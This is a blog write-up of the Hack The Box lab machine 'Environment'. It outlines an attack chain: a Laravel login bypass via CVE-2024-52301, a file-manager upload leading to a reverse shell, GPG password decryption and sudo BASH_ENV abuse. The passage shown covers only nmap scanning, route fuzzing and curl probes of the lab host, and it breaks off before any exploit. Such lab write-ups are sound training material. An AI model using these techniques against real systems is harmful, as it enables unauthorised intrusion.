<!DOCTYPE html>
<html lang="en-US">

<head>
  <meta charset='utf-8'>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="index, follow">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
    integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
  <script src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
    crossorigin="anonymous"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
    integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI"
    crossorigin="anonymous"></script>
  <link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon" />
  <script type="text/javascript" async
    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
    </script>
  <link rel="stylesheet" href="/assets/css/style.css?v=d3711f92fe3888b885f6dd03b5d194e8c5275cc5">
  <link rel="stylesheet" href="/assets/css/prism.css">
  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" rel="stylesheet" crossorigin="anonymous">
  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/brands.min.css" rel="stylesheet" crossorigin="anonymous">
  
  <meta name="theme-color" content="#000000" />
  <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HTB Environment writeup | Gabriel blog</title>
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="HTB Environment writeup" />
<meta name="author" content="gabri47" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Environment is a linux medium difficulty machine. First, I will abuse CVE-2024-52301 in a laravel web server to change environment to preprod because login page can be bypassed with that. Then, I will abuse laravel-filemanager CVE-2024-21546 vulnerability to upload a php file that gives me a reverse shell. After that, I will decrypt a gpg file that contains hish password. Finally, I will abuse BASH_ENV in sudoers to execute a script with sudo and get root access." />
<meta property="og:description" content="Environment is a linux medium difficulty machine. First, I will abuse CVE-2024-52301 in a laravel web server to change environment to preprod because login page can be bypassed with that. Then, I will abuse laravel-filemanager CVE-2024-21546 vulnerability to upload a php file that gives me a reverse shell. After that, I will decrypt a gpg file that contains hish password. Finally, I will abuse BASH_ENV in sudoers to execute a script with sudo and get root access." />
<link rel="canonical" href="http://localhost:4000/writeups/HTB/Environment.html" />
<meta property="og:url" content="http://localhost:4000/writeups/HTB/Environment.html" />
<meta property="og:site_name" content="Gabriel blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-09-19T00:00:00+02:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HTB Environment writeup" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2025-09-19T00:00:00+02:00","datePublished":"2025-09-19T00:00:00+02:00","description":"Environment is a linux medium difficulty machine. First, I will abuse CVE-2024-52301 in a laravel web server to change environment to preprod because login page can be bypassed with that. Then, I will abuse laravel-filemanager CVE-2024-21546 vulnerability to upload a php file that gives me a reverse shell. After that, I will decrypt a gpg file that contains hish password. Finally, I will abuse BASH_ENV in sudoers to execute a script with sudo and get root access.","headline":"HTB Environment writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/HTB/Environment.html"},"url":"http://localhost:4000/writeups/HTB/Environment.html"}</script>
<!-- End Jekyll SEO tag -->

  
</head>

<body>

  <div id="header">
    <div class="container">
      <div class="title-container">
        <a id="a-title" href="/">
          <h1>Gabriel blog</h1>
        </a>
        <small class="nav-main d-flex justify-content-center">
    
    <a href="/writeups">Writeups</a>
    
     <span style="color: #b5e853;">|</span> 
    
    
    <a href="/blog">Blog</a>
    
    
</small>

      </div>
      <br>

      
      
<nav class="navbar navlinks">
    <button class="navbar-toggler d-flex w-100 justify-content-between collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="true" aria-label="Toggle navigation">
        <span>HTB Writeups</span>
        <i style="float: right;" class="fa fa-bars menu-icon" aria-hidden="true"></i>
    </button>

    <div class="navbar-collapse collapse" id="navbarSupportedContent">
        <div class="m-1 mt-2">

            
            
            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Environment.html"> HTB Environment writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;laravel/&gt; &lt;cve-2024-52301/&gt; &lt;laravel-environment/&gt; &lt;cve-2024-21546/&gt; &lt;gpg-decrypt/&gt; &lt;bash_env-variable/&gt; &lt;sudoers/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Blurry.html"> HTB Blurry writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;clearml/&gt; &lt;machine-learning/&gt; &lt;CVE-2024-24590/&gt; &lt;pickle/&gt; &lt;deserialization/&gt; &lt;python-torch/&gt; &lt;sudoers/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Freelancer.html"> HTB Freelancer writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;forgot-password/&gt; &lt;idor/&gt; &lt;qrcode/&gt; &lt;mssql/&gt; &lt;xp_cmdshell/&gt; &lt;sql-configuration/&gt; &lt;crash-dump-analysis/&gt; &lt;active-directory-acls/&gt; &lt;genericwrite/&gt; &lt;nt-hashes/&gt; &lt;secretsdump/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Boardlight.html"> HTB Boardlight writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;dolibarr/&gt; &lt;CVE-2023-30253/&gt; &lt;subdomain-enumeration/&gt; &lt;crm/&gt; &lt;erp/&gt; &lt;php-injection/&gt; &lt;php-configuration/&gt; &lt;mysql/&gt; &lt;password-reuse/&gt; &lt;suid/&gt; &lt;enlightenment/&gt; &lt;CVE-2022-37706/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Solarlab.html"> HTB Solarlab writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;smb/&gt; &lt;spreadsheet/&gt; &lt;libreoffice/&gt; &lt;bruteforcing-web/&gt; &lt;rce/&gt; &lt;CVE-2023-33733/&gt; &lt;pdf/&gt; &lt;openfire-exploit/&gt; &lt;CVE-2023-32315/&gt; &lt;openfire-database/&gt; &lt;decrypt-password/&gt; &lt;java/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Intuition.html"> HTB Intuition writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;xss/&gt; &lt;cookie-hijacking/&gt; &lt;cve-2023-24329/&gt; &lt;urllib/&gt; &lt;ssrf/&gt; &lt;ssrf-to-lfi/&gt; &lt;url-wrappers/&gt; &lt;ftp/&gt; &lt;ssh-key/&gt; &lt;ssh-key-comments/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;binary-analysis/&gt; &lt;suricata-logs/&gt; &lt;sudoers/&gt; &lt;ghidra/&gt; &lt;command-execution/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Mailing.html"> HTB Mailing writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;lfi/&gt; &lt;hMailServer/&gt; &lt;hMailServer-configuration/&gt; &lt;hash-cracking/&gt; &lt;outlook-vulnerabilities/&gt; &lt;CVE-2024-21413/&gt; &lt;ntlm-hash/&gt; &lt;libreoffice-odt-exploit/&gt; &lt;CVE-2023-2255/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Skyfall.html"> HTB Skyfall writeup</a>
                    <br>
                    <small>[50]</small>
                    <span class="tag">
                        <small>
                            &lt;forbidden-bypass/&gt; &lt;minio-cloud/&gt; &lt;minio-cve/&gt; &lt;CVE-2023-28432/&gt; &lt;hashicorp-vault/&gt; &lt;vault-ssh/&gt; &lt;sudoers/&gt; &lt;vault-unseal/&gt; &lt;race-condition/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Runner.html"> HTB Runner writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;teamcity/&gt; &lt;cve-2023-42793/&gt; &lt;teamcity-api/&gt; &lt;teamcity-rce/&gt; &lt;hsql/&gt; &lt;bcrypt/&gt; &lt;hash-cracking/&gt; &lt;id_rsa/&gt; &lt;portainer/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/FormulaX.html"> HTB FormulaX writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;xss/&gt; &lt;websocket/&gt; &lt;simple-git-cve/&gt; &lt;CVE-2022-24066/&gt; &lt;mongodb/&gt; &lt;hash-cracking/&gt; &lt;librenms/&gt; &lt;librenms-abuse-template/&gt; &lt;laravel-blade/&gt; &lt;php/&gt; &lt;env-creds/&gt; &lt;sudoers/&gt; &lt;libreoffice-server-abuse/&gt; &lt;apache-uno-api/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Usage.html"> HTB Usage writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;sql-injection/&gt; &lt;boolean-based-sql-injection/&gt; &lt;hash-cracking/&gt; &lt;upload-vulnerabilities/&gt; &lt;monit/&gt; &lt;sudoers/&gt; &lt;abuse-symlinks/&gt; &lt;zip/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/IClean.html"> HTB IClean writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;xss/&gt; &lt;ssti/&gt; &lt;sql/&gt; &lt;password-reuse/&gt; &lt;qpdf/&gt; &lt;sudoers/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/WifineticTwo.html"> HTB WifineticTwo writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;openplc/&gt; &lt;cve-2021-31630/&gt; &lt;wifi-scanning/&gt; &lt;pixiedust/&gt; &lt;port-scanning/&gt; &lt;ssh/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Headless.html"> HTB Headless writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;xss/&gt; &lt;command-injection/&gt; &lt;sudoers/&gt; &lt;path-hijacking-.//&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Corporate.html"> HTB Corporate writeup</a>
                    <br>
                    <small>[50]</small>
                    <span class="tag">
                        <small>
                            &lt;xss/&gt; &lt;bypass-csp/&gt; &lt;cookie-hijacking/&gt; &lt;idor/&gt; &lt;vpn/&gt; &lt;password-spraying/&gt; &lt;.mozilla-enumeration/&gt; &lt;bruteforce-bitwarden-pin/&gt; &lt;source-code-analysis/&gt; &lt;cookie-forging/&gt; &lt;jwt/&gt; &lt;docker-privesc/&gt; &lt;abupve/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Perfection.html"> HTB Perfection writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;ssti/&gt; &lt;ruby/&gt; &lt;crlf-injection/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;sudo-group/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Jab.html"> HTB Jab writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;xmpp/&gt; &lt;xmpp-user-enumeration/&gt; &lt;asreproast/&gt; &lt;hash-cracking/&gt; &lt;executedcom/&gt; &lt;dcomexec.py/&gt; &lt;openfire-rce/&gt; &lt;CVE-2023-32315/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Office.html"> HTB Office writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;joomla-information-disclosure/&gt; &lt;CVE-2023-23752/&gt; &lt;smb-enumeration/&gt; &lt;pcap-tcp-packet-analysis/&gt; &lt;wireshark/&gt; &lt;krb-hash/&gt; &lt;joomla-rce/&gt; &lt;runascs/&gt; &lt;password-reuse/&gt; &lt;port-forwading/&gt; &lt;libreoffice-odt-exploitation/&gt; &lt;CVE-2023-2255/&gt; &lt;dpapi-creds/&gt; &lt;mimikatz/&gt; &lt;bloodhound/&gt; &lt;modifying-group-policy/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Crafty.html"> HTB Crafty writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;minecraft/&gt; &lt;log4j/&gt; &lt;jdgui/&gt; &lt;analyzing-jar/&gt; &lt;minecraft-plugins/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Pov.html"> HTB Pov Writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;lfi/&gt; &lt;web.config/&gt; &lt;deserialization/&gt; &lt;exploiting-viewstate/&gt; &lt;decrypting-securestring/&gt; &lt;sedebugprivilege/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Analysis.html"> HTB Analysis Writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;fuzzing/&gt; &lt;ldap-injection/&gt; &lt;php-shell/&gt; &lt;upload-vulnerabilities/&gt; &lt;autologon/&gt; &lt;dll-injection/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Bizness.html"> HTB Bizness Writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;apache_ofbiz/&gt; &lt;CVE-2023-51467/&gt; &lt;CVE-2023-49070/&gt; &lt;hash_cracking/&gt; &lt;hash_salt/&gt; &lt;su/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Ouija.html"> HTB Ouija Writeup</a>
                    <br>
                    <small>[50]</small>
                    <span class="tag">
                        <small>
                            &lt;fuzzing/&gt; &lt;html_inspection/&gt; &lt;information_leakage/&gt; &lt;haproxy/&gt; &lt;http_request_smuggling/&gt; &lt;CVE-2021-40346/&gt; &lt;source_code_inspection/&gt; &lt;hash_extension_attack/&gt; &lt;lfi/&gt; &lt;proc_files/&gt; &lt;php_plugin/&gt; &lt;integer_overflow/&gt; &lt;buffer_overflow/&gt; &lt;webshell/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Monitored.html"> HTB Monitored Writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;udp/&gt; &lt;snmp/&gt; &lt;nagiosxi/&gt; &lt;api/&gt; &lt;nagios_rce/&gt; &lt;sudoers/&gt; &lt;abusing_nagios_scripts/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Napper.html"> HTB Napper Writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;information_disclosure/&gt; &lt;abusing_backdoor/&gt; &lt;naplistener/&gt; &lt;elasticsearch/&gt; &lt;reverse_engineering/&gt; &lt;go_reverse_engineering/&gt; &lt;decryption_with_AES/&gt; &lt;runascs/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Devvortex.html"> HTB Devvortex Writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;joomla/&gt; &lt;CVE-2023-23752/&gt; &lt;information_leakage/&gt; &lt;password_reuse/&gt; &lt;joomla_rce/&gt; &lt;database_enumeration/&gt; &lt;hash_cracking/&gt; &lt;ssh/&gt; &lt;sudoers/&gt; &lt;apport-cli/&gt; &lt;CVE-2023-1326/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Surveillance.html"> HTB Surveillance writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;craft_cms/&gt; &lt;hash_cracking/&gt; &lt;zoneminder_exploit/&gt; &lt;sudoers/&gt; &lt;abusing_zmupdate.pl/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Hospital.html"> HTB Hospital Writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;webshell_upload/&gt; &lt;kernel_exploits/&gt; &lt;hash_cracking/&gt; &lt;pivoting/&gt; &lt;phishing/&gt; &lt;ghostscript_rce/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/HTB/Codify.html"> HTB Codify Writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;nodejs/&gt; &lt;rce/&gt; &lt;sqlite3/&gt; &lt;hashes/&gt; &lt;sudoers/&gt; &lt;bash-bruteforcing/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            
            

        </div>
    </div>
</nav>

      
      <div id="bottom-bar">
        <div class="social d-flex flex-column justify-content-center w-100">
    <a href="/search" class="text-center w-100 mt-3 mb-2">
      <i class="fa fa-sm fa-search"></i>
    </a>
    <div class="social-links-bar d-flex justify-content-center mb-2">
        
        
        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
        </a>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    </div>
    
    <div class="htb_badge d-flex justify-content-center">
        
        <script src="https://www.hackthebox.eu/badge/831031"></script>
        
    </div>
    <div class="thm_badge">
        
    </div>
    
</div>

      </div>
    </div>
  </div>

  <div id="content" class="container">
    <section id="main_content">
      <h5 class="mt-0 mb-2">
        
        
          HTB
        
        
      </h5>
    
      <h1 class="d-flex w-100 justify-content-between">
        
        
          <span>HTB Environment writeup</span> <span class="points"> [30 pts] </span>
        
        
      </h1>


<script>

</script>


<p>Environment is a linux medium difficulty machine. First, I will abuse <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52301">CVE-2024-52301</a> in a laravel web server to change environment to <code>preprod</code> because login page can be bypassed with that. Then, I will abuse laravel-filemanager <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21546">CVE-2024-21546</a> vulnerability to upload a php file that gives me a reverse shell. After that, I will decrypt a gpg file that contains hish password. Finally, I will abuse BASH_ENV in sudoers to execute a script with sudo and get root access.</p>
    
      <h1 id="ports-enumeration-with-nmap">
        
        
          Ports enumeration with nmap <a href="#ports-enumeration-with-nmap" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
        
        
      </h1>

<pre><code class="language-bash">❯ sudo nmap -sS -sVC -p- --open --min-rate 5000 -v -n -Pn 10.10.11.67 -oA environment
&lt;..SNIP..&gt;
❯ cat environment.nmap
# Nmap 7.94SVN scan initiated Sun Sep 14 14:37:46 2025 as: nmap -sS -sVC -p- --open --min-rate 5000 -v -n -Pn -oA environment 10.10.11.67
Nmap scan report for 10.10.11.67
Host is up (0.10s latency).
Not shown: 62559 closed tcp ports (reset), 2973 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp   open  http    nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://environment.htb

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 14 14:38:11 2025 -- 1 IP address (1 host up) scanned in 25.01 seconds
</code></pre>

<blockquote>
  <p><a href="http://gabrielgonzalez211.github.io/blog/nmap-arguments.html">My used arguments for nmap</a></p>
</blockquote>

<p>22 -&gt; OpenSSH
80 -&gt; nginx 1.22.1, redirect to <code>environment.htb</code></p>

<p>Add to <code>/etc/hosts</code>:</p>

<pre><code class="language-bash">❯ sudo vi /etc/hosts
10.10.11.67 environment.htb
</code></pre>
    
      <h1 id="web-enumeration">
        
        
          Web enumeration <a href="#web-enumeration" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
        
        
      </h1>

<p>Main page:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914144445.png" alt="image"></p>

<p>Mailing list:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914144618.png" alt="image"></p>

<p>It’s a post request to <code>/mailing</code>:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914144710.png" alt="image"></p>

<p>Successfull message:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914144853.png" alt="image"></p>

<p>When I don’t put a correct email it displays error message:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914145657.png" alt="image"></p>

<p>It’s a laravel page because there’s a <code>laravel_session</code> cookie:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914145955.png" alt="image"></p>

<p>Routes fuzzing reveals some new routes:</p>

<pre><code class="language-bash"> ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://environment.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l       27w     1713c http://environment.htb/build/assets/styles-Bl2K3jyg.css
200      GET        1l      119w     4111c http://environment.htb/build/assets/login-CnECh1Us.css                200      GET       54l      174w     2391c http://environment.htb/login 
302      GET       12l       22w      358c http://environment.htb/logout =&gt; http://environment.htb/login
405      GET     2575l     8675w   244841c http://environment.htb/mailing
200      GET       87l      392w     4602c http://environment.htb/
405      GET     2575l     8675w   244839c http://environment.htb/upload
200      GET       50l      135w     2125c http://environment.htb/up
301      GET        7l       11w      169c http://environment.htb/storage =&gt; http://environment.htb/storage/
301      GET        7l       11w      169c http://environment.htb/storage/files =&gt; http://environment.htb/storage/files/
301      GET        7l       11w      169c http://environment.htb/build =&gt; http://environment.htb/build/
301      GET        7l       11w      169c http://environment.htb/build/assets =&gt; http://environment.htb/build/assets/
301      GET        7l       11w      169c http://environment.htb/vendor =&gt; http://environment.htb/vendor/
[####################] - 27m   135674/135674  0s      found:13      errors:2      
[####################] - 27m    30000/30000   19/s    http://environment.htb/ 
[####################] - 27m    30000/30000   18/s    http://environment.htb/storage/
[####################] - 27m    30000/30000   18/s    http://environment.htb/storage/files/
[####################] - 27m    30000/30000   19/s    http://environment.htb/vendor/      
</code></pre>

<p><code>/login</code> displays a Marketing Management Portal:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914164214.png" alt="image"></p>

<p>If I enter any random email and password, it gives an error:</p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914164301.png" alt="image"></p>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914164315.png" alt="image"></p>

<p><code>/upload</code> doesn’t receive GET method:</p>

<pre><code class="language-bash">❯ curl -i -s -X GET -d '' http://environment.htb/upload | head
HTTP/1.1 405 Method Not Allowed
Server: nginx/1.22.1
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
allow: POST
Cache-Control: no-cache, private
date: Sun, 14 Sep 2025 14:43:50 GMT

&lt;!DOCTYPE html&gt;
</code></pre>

<p><img src="/assets/images/Environment/Pasted%20image%2020250914174210.png" alt="image"></p>

<p>But if I make a POST request, it neither works because it seems to need a valid csrf token, that I sense that is obtained when it gets logged in:</p>

<pre><code class="language-bash">❯ curl -i -s -X POST -d '' http://environment.htb/upload | head
HTTP/1.1 419 unknown status
